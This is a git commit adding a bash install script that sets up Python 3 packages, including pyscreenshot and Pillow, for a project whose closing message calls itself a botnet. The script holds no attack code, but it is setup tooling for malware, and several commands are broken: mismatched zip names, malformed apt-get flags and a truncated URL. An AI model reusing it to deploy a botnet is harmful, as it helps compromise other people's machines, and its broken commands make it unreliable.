9a21a250113b5c67485ea93d0e71c9253de6a9a7
grant-ward <grant_ward@mail2tor.com>
2016-12-12 01:21:51 +0000

    Create install.sh
    Script bash to install dependencies for Python 3 in Linux

---
+++ install.sh
@@ -0,0 +1,36 @@
+#!/bin/bash
+
+if [ -e /etc/pacman.conf ]
+then
+	sudo pacman -S python-pip
+	sudo pacman -S python-dev
+	sudo pip3 install pyscreenshot
+	echo "Installing image library for Python3..."	
+	wget https://pypi.python.org/packages/b4/6d/f313f1bff98f6d1e353918e0a4e8e17a22af86f0ad10c231228342edf74d/Pillow-2.2.1.zip#md5=d1d20d3db5d1ab312da0951ff061e6bf
+ 	unzip Pillow-2.1.zip
+	cd Pillow-2.2.1/
+	sudo python3 setup.py build
+	sudo python3 setup.py install
+	clear
+	echo "Installed, use script 'generate.sh', to use the botnet!"
+elif [ -e /etc/apt ]
+then
+	sudo apt-get install -S python3-pip
+        sudo apt-get install-S python3-dev
+        sudo pip3 install pyscreenshot
+        echo "Installing image library for Python3..."
+        wget https://pypi.python.org/packages/b4/6d/f313f1bff98f6d1e353918e0a4e8e17a22af86f0ad10c231228342edf74d/Pillow-2.2.1.zip#md5=$
+        unzip Pillow-2.1.zip
+        cd Pillow-2.2.1/
+        sudo python3 setup.py build
+        sudo python3 setup.py install
+        clear
+        echo "Installed, use script 'generate.sh', to use the botnet!"
+
+
+else 
+	echo "Your system is unsupported by this script"
+	echo "Please install the dependencies manually"
+	
+fi
+
